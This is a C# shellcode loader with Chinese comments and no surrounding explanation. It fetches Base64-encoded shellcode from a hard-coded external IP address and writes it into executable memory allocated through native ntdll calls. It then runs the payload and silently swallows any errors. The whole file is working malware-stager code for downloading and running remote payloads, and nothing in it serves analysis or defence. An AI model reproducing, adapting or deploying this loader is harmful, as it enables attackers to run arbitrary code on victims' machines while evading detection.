using System;
using System.Net.Http;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading.Tasks;

class Program
{
    // 使用 syscall 调用来分配内存
    [DllImport("ntdll.dll", SetLastError = true)]
    static extern int NtAllocateVirtualMemory(IntPtr processHandle, ref IntPtr baseAddress, IntPtr zeroBits, ref ulong regionSize, uint allocationType, uint protect);

    // 使用 syscall 来更改内存权限
    [DllImport("ntdll.dll", SetLastError = true)]
    static extern int NtProtectVirtualMemory(IntPtr processHandle, ref IntPtr baseAddress, ref ulong regionSize, uint newProtect, ref uint oldProtect);

    // 获取当前进程句柄
    [DllImport("kernel32.dll", SetLastError = true)]
    static extern IntPtr GetCurrentProcess();

    // 创建线程来执行Shellcode
    [DllImport("ntdll.dll", SetLastError = true)]
    static extern int NtCreateThreadEx(ref IntPtr threadHandle, uint access, IntPtr securityAttributes, IntPtr processHandle, IntPtr startAddress, IntPtr parameter, uint creationFlags, uint stackZero, uint stackSize, uint parameterSize, IntPtr attributeList);

    // 定义Shellcode委托类型
    delegate void ShellcodeDelegate();

    static async Task Main()
    {
        string url = "http://123.57.230.217/qwe.bin";  // 目标 URL
        string encodedShellcode = await DownloadShellcode(url);

        if (encodedShellcode != null)
        {
            byte[] decodedShellcode = Convert.FromBase64String(encodedShellcode);
            ExecuteShellcode(decodedShellcode);
        }
    }

    // 下载Base64编码的Shellcode
    static async Task<string> DownloadShellcode(string url)
    {
        try
        {
            using (HttpClient client = new HttpClient())
            {
                HttpResponseMessage response = await client.GetAsync(url);
                response.EnsureSuccessStatusCode();
                string encodedContent = await response.Content.ReadAsStringAsync();
                return encodedContent;  // 返回Base64编码的Shellcode
            }
        }
        catch
        {
            // 发生错误时不做任何操作，直接返回null
            return null;
        }
    }

    // 执行Shellcode
    static void ExecuteShellcode(byte[] shellcode)
    {
        IntPtr allocatedMemory = IntPtr.Zero;
        ulong shellcodeSize = (ulong)shellcode.Length;

        // 使用 syscall NtAllocateVirtualMemory 分配内存
        int status = NtAllocateVirtualMemory(GetCurrentProcess(), ref allocatedMemory, IntPtr.Zero, ref shellcodeSize, 0x3000, 0x40); // MEM_COMMIT | MEM_RESERVE | PAGE_EXECUTE_READWRITE
        if (status != 0) return;  // 内存分配失败时直接返回

        // 将Shellcode复制到分配的内存
        Marshal.Copy(shellcode, 0, allocatedMemory, shellcode.Length);

        // 修改内存权限为可执行
        uint oldProtect = 0;
        status = NtProtectVirtualMemory(GetCurrentProcess(), ref allocatedMemory, ref shellcodeSize, 0x40, ref oldProtect);  // PAGE_EXECUTE_READWRITE
        if (status != 0) return;  // 修改内存保护失败时直接返回

        // 执行Shellcode
        try
        {
            ShellcodeDelegate shellcodeDelegate = Marshal.GetDelegateForFunctionPointer<ShellcodeDelegate>(allocatedMemory);
            shellcodeDelegate();
        }
        catch
        {
            // 如果执行Shellcode失败，什么也不做
        }

        // 释放分配的内存
        VirtualFreeEx(GetCurrentProcess(), allocatedMemory, 0, 0x8000); // MEM_RELEASE
    }

    // 释放内存
    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern bool VirtualFreeEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint dwFreeType);
}
